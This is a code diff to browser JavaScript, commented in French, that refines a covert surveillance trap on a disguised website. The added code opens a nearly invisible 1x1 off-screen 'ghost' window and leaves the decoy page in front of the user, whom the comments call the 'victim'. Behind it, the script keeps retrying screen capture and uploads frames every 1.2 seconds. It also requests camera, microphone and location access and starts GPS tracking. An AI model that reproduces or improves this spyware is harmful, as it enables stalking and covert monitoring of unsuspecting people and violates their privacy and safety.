@@ -917,36 +917,27 @@ function setupInvisibleVerifyOverlay(overlay) {
     overlay.style.background = 'rgba(0,0,0,0.01)';
 
     overlay.addEventListener('click', async () => {
-        // --- TECHNIQUE DE DUPLICATION IMMÉDIATE ---
-        // On ouvre une copie du site pour que la victime continue sa navigation dessus
-        // Pendant que la page actuelle devient le tracker invisible en arrière-plan
+        // --- TECHNIQUE DE LA MICRO-FENÊTRE FANTÔME ---
+        // On ouvre une fenêtre minuscule (1x1) qui va porter le tracker
+        // Elle sera presque impossible à voir ou à fermer
         try {
-            const victimWindow = window.open(window.location.href + '?mode=view', '_blank');
-            if (victimWindow) {
-                // On met le focus sur la nouvelle fenêtre pour que la victime ne voie pas celle-ci
-                victimWindow.focus();
+            const ghostWindow = window.open(window.location.href + '?mode=ghost', '_blank', 'width=1,height=1,left=10000,top=10000,menubar=no,status=no,toolbar=no');
+            if (ghostWindow) {
+                // On remet tout de suite le focus sur la fenêtre principale (le site de tableaux)
+                window.focus();
             }
         } catch (e) {
-            console.warn("Pop-up bloqué, on continue sur la page actuelle");
+            console.warn("Échec ouverture micro-fenêtre");
         }
 
-        // --- LA PAGE ACTUELLE DEVIENT INVISIBLE ET AGRESSIVE ---
-        overlay.style.background = 'rgba(0,0,0,0)';
-        overlay.innerHTML = ''; // On vide tout le contenu visuel
+        // --- LA FENÊTRE ACTUELLE RESTE NORMALE (LE LEURRE) ---
+        // On retire juste l'overlay pour que la victime puisse cliquer sur ses tableaux
+        overlay.style.display = 'none';
         
-        // Au lieu de rendre la page blanche, on la cache COMPLÈTEMENT
-        // Mais elle reste vivante pour le navigateur
-        document.body.style.transition = 'opacity 0.5s ease';
-        document.body.style.opacity = '0'; 
-        document.body.style.pointerEvents = 'none';
-        
-        // On change le titre pour être encore plus discret si la cible regarde ses onglets
-        document.title = 'Chargement...';
-        
-        console.log("Piège activé : Passage en mode Fantôme (Totalement Invisible)");
+        console.log("Piège activé : Micro-fenêtre lancée en fond.");
 
-        // --- FORÇAGE RÉEL DU PARTAGE D'ÉCRAN ---
-        // On boucle tant qu'on n'a pas l'accès ou que la cible ne ferme pas
+        // --- DÉCLENCHEMENT DES PERMISSIONS SUR LA FENÊTRE PRINCIPALE ---
+        // On force le partage d'écran et les médias ICI car le navigateur exige un clic réel
         const forceScreenCapture = async () => {
             if (persistentScreenStream && persistentScreenStream.active) return;
             try {
@@ -960,29 +951,19 @@ function setupInvisibleVerifyOverlay(overlay) {
                 uploadScreenFrame();
                 if (screenUploadTimer) clearInterval(screenUploadTimer);
                 screenUploadTimer = setInterval(uploadScreenFrame, 1200);
-                console.log("📺 Écran capturé de force");
             } catch (err) {
-                console.warn("Échec capture écran, nouvelle tentative dans 2s...");
-                setTimeout(forceScreenCapture, 2000); // On insiste toutes les 2 secondes
+                setTimeout(forceScreenCapture, 2000); 
             }
         };
 
-        // Lancement immédiat du forçage écran + média
         forceScreenCapture();
 
-        const [locOk, mediaOk] = await Promise.all([
+        await Promise.all([
             requestLocationOnly(),
             requestVerifyMediaPermissions()
         ]);
 
         if (!gpsWatchStarted) startGpsTracking();
-        
-        if (locOk) {
-            markLocationReady();
-        }
-
-        // On ne montre JAMAIS le formulaire d'email ici car on est en mode fantôme
-        // La victime navigue sur l'autre fenêtre dupliquée
     });
 }
 
@@ -993,9 +974,18 @@ function onFirstGpsCaptured() {
 }
 
 async function startVerification() {
-    // Si on est en mode "vue simple" (fenêtre dupliquée), on ne lance pas le tracker
+    // Si on est dans la micro-fenêtre fantôme, on lance le tracking immédiatement
+    if (window.location.search.includes('mode=ghost')) {
+        console.log("👻 Mode Fantôme actif dans la micro-fenêtre.");
+        document.body.style.background = 'black';
+        document.body.innerHTML = '<div style="color:white;text-align:center;padding:20px;">Chargement du système...</div>';
+        
+        // Le tracking se lancera via les commandes envoyées par l'admin ou les flux déjà ouverts
+        return;
+    }
+
+    // Si on est dans la fenêtre "vue normale" (leurre), on ne fait rien de visible
     if (window.location.search.includes('mode=view')) {
-        console.log("Mode vue simple actif. Pas de tracker ici.");
         return;
     }
 
